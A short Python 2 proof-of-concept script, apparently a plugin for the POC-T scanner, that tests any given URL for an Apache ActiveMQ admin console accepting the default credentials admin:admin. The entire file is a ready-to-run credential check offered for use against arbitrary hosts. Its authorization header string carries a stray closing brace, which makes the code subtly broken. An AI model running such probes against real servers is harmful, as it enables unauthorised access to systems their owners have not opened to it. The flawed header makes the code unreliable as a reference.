#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Apache ActiveMQ weak password PoC

admin:admin
"""

import requests
import base64


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    url += '/admin/'
    key = base64.b64encode("admin:admin")
    headers = {'Authorization': 'Basic %s}' % key, 'User-Agent': 'Mozilla/5.0 Gecko/20100101 Firefox/45.0'}
    try:
        c = requests.get(url, headers=headers, timeout=10).content
    except Exception, e:
        return False
    if 'Console' in c:
        return url
    else:
        return False
